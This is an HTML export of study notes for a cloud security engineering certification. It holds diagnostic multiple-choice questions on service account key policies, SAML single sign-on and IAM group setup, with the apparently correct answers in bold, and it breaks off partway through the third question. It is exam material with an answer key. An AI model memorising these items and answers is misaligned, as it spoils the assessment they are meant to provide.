<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>

<link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color: #ffffff; --text-color: #333333; --select-text-bg-color: #B5D6FC; --select-text-font-color: auto; --monospace: "Lucida Console",Consolas,"Courier",monospace; --title-bar-height: 20px; }
.mac-os-11 { --title-bar-height: 28px; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
h1, h2, h3, h4, h5 { white-space: pre-wrap; }
body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.428571; overflow-x: hidden; background: inherit; }
iframe { margin: auto; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
#write.first-line-indent p { text-indent: 2em; }
#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
#write.first-line-indent li { margin-left: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
.typora-export .task-list-item input { pointer-events: none; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  #write { padding-left: 20px; padding-right: 20px; }
}
#write li > figure:last-child { margin-bottom: 0.5rem; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
button, input, select, textarea { color: inherit; font-style: inherit; font-variant-caps: inherit; font-weight: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-family: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-variant-emoji: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
p { line-height: inherit; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px; }
thead, tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 32px; }
.CodeMirror-gutters { border-right-width: 0px; border-right-style: none; border-right-color: currentcolor; background-color: inherit; }
.CodeMirror-linenumber { -webkit-user-select: none; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
#write pre { white-space: pre-wrap; }
#write.fences-no-line-wrapping pre { white-space: pre; }
#write pre.ty-contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
#write .md-fences.mock-cm { white-space: pre-wrap; }
.md-fences.md-fences-with-lineno { padding-left: 0px; }
#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
.CodeMirror-line, twitterwidget { break-inside: avoid; }
svg { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li blockquote { margin: 1rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
#write .footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
  #write { margin-top: 0px; border-color: transparent !important; padding-top: 0px !important; padding-bottom: 0px !important; }
  .typora-export * { print-color-adjust: exact; }
  .typora-export #write { break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  .is-mac table { break-inside: avoid; }
  #write > p:nth-child(1) { margin-top: 0px; }
  .typora-export-show-outline .typora-export-sidebar { display: none; }
  figure { overflow-x: visible; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
p > .md-image:only-child { display: inline-block; width: 100%; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.md-math-block { width: 100%; }
.md-math-block:not(:empty)::after { display: none; }
.MathJax_ref { fill: currentcolor; }
[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: medium; }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { text-decoration: underline; }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.reversefootnote { font-family: ui-monospace, sans-serif; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, samp, tt { font-family: var(--monospace); }
kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
code { text-align: left; vertical-align: initial; }
a.md-print-anchor { white-space: pre !important; border-width: medium !important; border-style: none !important; border-color: currentcolor !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom-width: 0px; border-bottom-style: none; border-bottom-color: currentcolor; }
video { max-width: 100%; display: block; margin: 0px auto; }
iframe { max-width: 100%; width: 100%; border: medium; }
.highlight td, .highlight tr { border: 0px; }
mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
.md-expand mark .md-meta { opacity: 0.3 !important; }
mark .md-meta { color: rgb(0, 0, 0); }
@media print {
  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
}
.md-diagram-panel .messageText { stroke: none !important; }
.md-diagram-panel .start-state { fill: var(--node-fill); }
.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
.md-fences.md-fences-math { font-size: 1em; }
.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
.md-fences-advanced:not(.md-focus) { background: inherit; }
.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
.typora-export-show-outline #write { --webkit-flex: 2; flex: 2 1 0%; }
.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
@media screen and (max-width: 1024px) {
  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
}
@media screen and (max-width: 800px) {
  .typora-export-sidebar { display: none; }
}
.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; overflow-wrap: anywhere; }
.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
.outline-content strong { font-weight: 400; }
.outline-expander { width: 1rem; height: 1.428571rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
.outline-expander:hover::before { content: ""; }
.outline-h1 > .outline-item { padding-left: 0px; }
.outline-h2 > .outline-item { padding-left: 1em; }
.outline-h3 > .outline-item { padding-left: 2em; }
.outline-h4 > .outline-item { padding-left: 3em; }
.outline-h5 > .outline-item { padding-left: 4em; }
.outline-h6 > .outline-item { padding-left: 5em; }
.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
.outline-label:hover { text-decoration: underline; }
.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left-width: 28px; border-left-style: solid; border-left-color: transparent; border-right-width: 28px; border-right-style: solid; border-right-color: transparent; }
.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
.outline-children { display: none; }
.info-panel-tab-wrapper { display: none; }
.outline-item-open > .outline-children { display: block; }
.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
.typora-export .outline-item:hover { margin-right: -8px; border-right-width: 8px; border-right-style: solid; border-right-color: transparent; }
.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
.typora-export-collapse-outline .outline-children { display: none; }
.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
.md-inline-math-container mjx-container { zoom: 0.95; }
mjx-container { break-inside: avoid; }
.md-alert.md-alert-note { border-left-color: rgb(9, 105, 218); }
.md-alert.md-alert-important { border-left-color: rgb(130, 80, 223); }
.md-alert.md-alert-warning { border-left-color: rgb(154, 103, 0); }
.md-alert.md-alert-tip { border-left-color: rgb(31, 136, 61); }
.md-alert.md-alert-caution { border-left-color: rgb(207, 34, 46); }
.md-alert { padding: 0px 1em; margin-bottom: 16px; color: inherit; border-left-width: 0.25em; border-left-style: solid; border-left-color: rgb(0, 0, 0); }
.md-alert-text-note { color: rgb(9, 105, 218); }
.md-alert-text-important { color: rgb(130, 80, 223); }
.md-alert-text-warning { color: rgb(154, 103, 0); }
.md-alert-text-tip { color: rgb(31, 136, 61); }
.md-alert-text-caution { color: rgb(207, 34, 46); }
.md-alert-text { font-size: 0.9rem; font-weight: 700; }
.md-alert-text svg { fill: currentcolor; position: relative; top: 0.125em; margin-right: 1ch; overflow: visible; }
.md-alert-text-container::after { content: attr(data-text); text-transform: capitalize; pointer-events: none; margin-right: 1ch; }


.CodeMirror { height: auto; }
.CodeMirror.cm-s-inner { background: inherit; }
.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
.CodeMirror-gutters { border-right-width: 1px; border-right-style: solid; border-right-color: rgb(221, 221, 221); background: inherit; white-space: nowrap; }
.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
.cm-negative { color: rgb(221, 68, 68); }
.cm-positive { color: rgb(34, 153, 34); }
.cm-header, .cm-strong { font-weight: 700; }
.cm-del { text-decoration: line-through; }
.cm-em { font-style: italic; }
.cm-link { text-decoration: underline; }
.cm-error { color: red; }
.cm-invalidchar { color: red; }
.cm-constant { color: rgb(38, 139, 210); }
.cm-defined { color: rgb(181, 137, 0); }
div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
.CodeMirror { position: relative; overflow: hidden; }
.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
.CodeMirror-sizer { position: relative; }
.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: medium !important; }
.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
.CodeMirror-lines { cursor: text; }
.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
.CodeMirror-code pre { border-right-width: 30px; border-right-style: solid; border-right-color: transparent; width: fit-content; }
.CodeMirror-wrap .CodeMirror-code pre { border-right-width: medium; border-right-style: none; border-right-color: currentcolor; width: auto; }
.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
.CodeMirror-measure pre { position: static; }
.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right-width: medium; border-right-style: none; border-right-color: currentcolor; width: 0px; }
.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
.cm-searching { background: rgba(255, 255, 0, 0.4); }
span.cm-underlined { text-decoration: underline; }
span.cm-strikethrough { text-decoration: line-through; }
.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
.cm-tw-deleted { text-decoration: line-through; }
.cm-tw-header5 { font-weight: 700; }
.cm-tw-listitem:first-child { padding-left: 10px; }
.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
.cm-tw-underline { text-decoration: underline; }
@media print {
  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
}


:root {
    --side-bar-bg-color: #fafafa;
    --control-text-color: #777;
}

@include-when-export url(https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext);

/* open-sans-regular - latin-ext_latin */
  /* open-sans-italic - latin-ext_latin */
    /* open-sans-700 - latin-ext_latin */
    /* open-sans-700italic - latin-ext_latin */
  html {
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
}

body {
    font-family: "Open Sans","Clear Sans", "Helvetica Neue", Helvetica, Arial, 'Segoe UI Emoji', sans-serif;
    color: rgb(51, 51, 51);
    line-height: 1.6;
}

#write {
    max-width: 860px;
  	margin: 0 auto;
  	padding: 30px;
    padding-bottom: 100px;
}

@media only screen and (min-width: 1400px) {
	#write {
		max-width: 1024px;
	}
}

@media only screen and (min-width: 1800px) {
	#write {
		max-width: 1200px;
	}
}

#write > ul:first-child,
#write > ol:first-child{
    margin-top: 30px;
}

a {
    color: #4183C4;
}
h1,
h2,
h3,
h4,
h5,
h6 {
    position: relative;
    margin-top: 1rem;
    margin-bottom: 1rem;
    font-weight: bold;
    line-height: 1.4;
    cursor: text;
}
h1:hover a.anchor,
h2:hover a.anchor,
h3:hover a.anchor,
h4:hover a.anchor,
h5:hover a.anchor,
h6:hover a.anchor {
    text-decoration: none;
}
h1 tt,
h1 code {
    font-size: inherit;
}
h2 tt,
h2 code {
    font-size: inherit;
}
h3 tt,
h3 code {
    font-size: inherit;
}
h4 tt,
h4 code {
    font-size: inherit;
}
h5 tt,
h5 code {
    font-size: inherit;
}
h6 tt,
h6 code {
    font-size: inherit;
}
h1 {
    font-size: 2.25em;
    line-height: 1.2;
    border-bottom: 1px solid #eee;
}
h2 {
    font-size: 1.75em;
    line-height: 1.225;
    border-bottom: 1px solid #eee;
}

/*@media print {
    .typora-export h1,
    .typora-export h2 {
        border-bottom: none;
        padding-bottom: initial;
    }

    .typora-export h1::after,
    .typora-export h2::after {
        content: "";
        display: block;
        height: 100px;
        margin-top: -96px;
        border-top: 1px solid #eee;
    }
}*/

h3 {
    font-size: 1.5em;
    line-height: 1.43;
}
h4 {
    font-size: 1.25em;
}
h5 {
    font-size: 1em;
}
h6 {
   font-size: 1em;
    color: #777;
}
p,
blockquote,
ul,
ol,
dl,
table{
    margin: 0.8em 0;
}
li>ol,
li>ul {
    margin: 0 0;
}
hr {
    height: 2px;
    padding: 0;
    margin: 16px 0;
    background-color: #e7e7e7;
    border: 0 none;
    overflow: hidden;
    box-sizing: content-box;
}

li p.first {
    display: inline-block;
}
ul,
ol {
    padding-left: 30px;
}
ul:first-child,
ol:first-child {
    margin-top: 0;
}
ul:last-child,
ol:last-child {
    margin-bottom: 0;
}
blockquote {
    border-left: 4px solid #dfe2e5;
    padding: 0 15px;
    color: #777777;
}
blockquote blockquote {
    padding-right: 0;
}
table {
    padding: 0;
    word-break: initial;
}
table tr {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 0;
}
table tr:nth-child(2n),
thead {
    background-color: #f8f8f8;
}
table th {
    font-weight: bold;
    border: 1px solid #dfe2e5;
    border-bottom: 0;
    margin: 0;
    padding: 6px 13px;
}
table td {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 6px 13px;
}
table th:first-child,
table td:first-child {
    margin-top: 0;
}
table th:last-child,
table td:last-child {
    margin-bottom: 0;
}

.CodeMirror-lines {
    padding-left: 4px;
}

.code-tooltip {
    box-shadow: 0 1px 1px 0 rgba(0,28,36,.3);
    border-top: 1px solid #eef2f2;
}

.md-fences,
code,
tt {
    border: 1px solid #e7eaed;
    background-color: #f8f8f8;
    border-radius: 3px;
    padding: 0;
    padding: 2px 4px 0px 4px;
    font-size: 0.9em;
}

code {
    background-color: #f3f4f4;
    padding: 0 2px 0 2px;
}

.md-fences {
    margin-bottom: 15px;
    margin-top: 15px;
    padding-top: 8px;
    padding-bottom: 6px;
}


.md-task-list-item > input {
  margin-left: -1.3em;
}

@media print {
    html {
        font-size: 13px;
    }
    pre {
        page-break-inside: avoid;
        word-wrap: break-word;
    }
}

.md-fences {
	background-color: #f8f8f8;
}
#write pre.md-meta-block {
	padding: 1rem;
    font-size: 85%;
    line-height: 1.45;
    background-color: #f7f7f7;
    border: 0;
    border-radius: 3px;
    color: #777777;
    margin-top: 0 !important;
}

.mathjax-block>.code-tooltip {
	bottom: .375rem;
}

.md-mathjax-midline {
    background: #fafafa;
}

#write>h3.md-focus:before{
	left: -1.5625rem;
	top: .375rem;
}
#write>h4.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h5.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h6.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
.md-image>.md-meta {
    /*border: 1px solid #ddd;*/
    border-radius: 3px;
    padding: 2px 0px 0px 4px;
    font-size: 0.9em;
    color: inherit;
}

.md-tag {
    color: #a7a7a7;
    opacity: 1;
}

.md-toc { 
    margin-top:20px;
    padding-bottom:20px;
}

.sidebar-tabs {
    border-bottom: none;
}

#typora-quick-open {
    border: 1px solid #ddd;
    background-color: #f8f8f8;
}

#typora-quick-open-item {
    background-color: #FAFAFA;
    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
    border-style: solid;
    border-width: 1px;
}

/** focus mode */
.on-focus-mode blockquote {
    border-left-color: rgba(85, 85, 85, 0.12);
}

header, .context-menu, .megamenu-content, footer{
    font-family: "Segoe UI", "Arial", sans-serif;
}

.file-node-content:hover .file-node-icon,
.file-node-content:hover .file-node-open-state{
    visibility: visible;
}

.mac-seamless-mode #typora-sidebar {
    background-color: #fafafa;
    background-color: var(--side-bar-bg-color);
}

.mac-os #write{
    caret-color: AccentColor;
}

.md-lang {
    color: #b4654d;
}

/*.html-for-mac {
    --item-hover-bg-color: #E6F0FE;
}*/

#md-notification .btn {
    border: 0;
}

.dropdown-menu .divider {
    border-color: #e5e5e5;
    opacity: 0.4;
}

.ty-preferences .window-content {
    background-color: #fafafa;
}

.ty-preferences .nav-group-item.active {
    color: white;
    background: #999;
}

.menu-item-container a.menu-style-btn {
    background-color: #f5f8fa;
    background-image: linear-gradient( 180deg , hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0)); 
}


 @media print { @page {margin: 0 0 0 0;} body.typora-export {padding-left: 0; padding-right: 0;} #write {padding:0;}}
</style><title>Professional Cloud Security Engineer Certification Learning Path</title>
</head>
<body class='typora-export'><div class='typora-export-content'>
<div id='write'  class=''><h1 id='professional-cloud-security-engineer-certification-learning-path'><span>Professional Cloud Security Engineer Certification Learning Path</span></h1><h1 id='01-preparing-for-your-professional-cloud-security-engineer-journey'><span>01 Preparing for Your Professional Cloud Security Engineer Journey </span></h1><h2 id='introduction'><span>Introduction</span></h2><p><a href='documents/T-GCPPCS-B-m0-l6-en-file-7.en.pdf'><span>Introduction</span></a></p><h2 id='configuring-access-within-a-cloud-solution-environment'><span>Configuring Access Within a Cloud Solution Environment</span></h2><p>&nbsp;</p><h3 id='diagnostic-questions'><span>Diagnostic questions</span></h3><p>&nbsp;</p><ol start='' ><li><p><span>Cymbal Bank recently discovered service account key misuse in one of the teams during a security audit. As a precaution, going forward you do not want any team in your organization to generate new external service account keys. You also want to restrict every new service account’s usage to its associated Project. What should you do?</span></p></li></ol><p>&nbsp;</p><ul><li><p><span>Navigate to Organizational policies in the Google Cloud Console. Select your organization. Select iam.disableServiceAccountKeyCreation. Under Policy Enforcement, select Merge with parent. Click Save. Repeat the process for iam.disableCrossProjectServiceAccountLienRemoval.</span></p></li></ul><p>&nbsp;</p><ul><li><p><span>Run the gcloud resource-manager org-policies enable-enforce command with the constraints iam.disableServiceAccountKeyCreation, and iam.disableCrossProjectServiceAccountUsage and the Project IDs you want the constraints to apply to.</span></p></li></ul><p>&nbsp;</p><ul><li><p><strong><span>Navigate to Organizational policies in the Google Cloud Console. Select your organization. Select iam.disableServiceAccountKeyCreation. Customize the applied to property, and set Enforcement to ‘On’. Click Save. Repeat the process for iam.disableCrossProjectServiceAccountUsage.</span></strong></p></li></ul><p>&nbsp;</p><ul><li><p><span>Run the gcloud resource-manager org-policies allow command with the boolean constraints iam.disableServiceAccountKeyCreation and iam.disableCrossProjectServiceAccountUsage with Organization ID.</span></p><p>&nbsp;</p></li></ul><ol start='2' ><li><p><span>Cymbal Bank publishes its APIs through Apigee. Cymbal Bank has recently acquired ABC Corp, which uses a third-party identity provider. You have been tasked with connecting ABC Corp’s identity provider to Apigee for single sign-on (SSO). You need to set up SSO so that Google is the service provider. You also want to monitor and log high-risk activities. Which two choices would you select to enable SSO?</span></p></li></ol><ul><li><p><span>Use openssl to generate public and private keys. Store the private key in an X.509 certificate, and encrypt using AES or DES for SAML. Sign in to the Google Admin console, and under Security, upload the certificate.</span></p></li><li><p><span>Review Network mapping results, and assign SAML profiles to required users.</span></p></li><li><p><strong><span>Review Network mapping results, and assign SSO profiles to required users.</span></strong></p></li><li><p><span>Use openssl to generate a private key. Store the private key in an X.509 certificate, and encrypt using AES or DES for SAML. Sign in to the Google Workspace Admin Console and upload the certificate.</span></p></li><li><p><strong><span>Use openssl to generate public and private keys. Store the public key in an X.509 certificate, and encrypt using RSA or DSA for SAML. Sign in to the Google Admin console, and under Security, upload the certificate.</span></strong></p></li></ul><p>&nbsp;</p><ol start='3' ><li><p><span>Cymbal Bank has certain default permissions and access for their analyst, finance, and teller teams. These teams are organized into groups that have a set of role-based IAM permissions assigned to them. After a recent acquisition of a small bank, you find that the small bank directly assigns permissions to their employees in IAM. You have been tasked with applying Cymbal Bank’s resource hierarchy to the small bank. Employees will need access to Google Cloud services. What should you do?</span></p></li></ol><ul><li><p><span>Reset all user permissions in the small bank’s IAM. Use the Directory API in the Google Workspace Admin SDK to create Google Groups. Use a 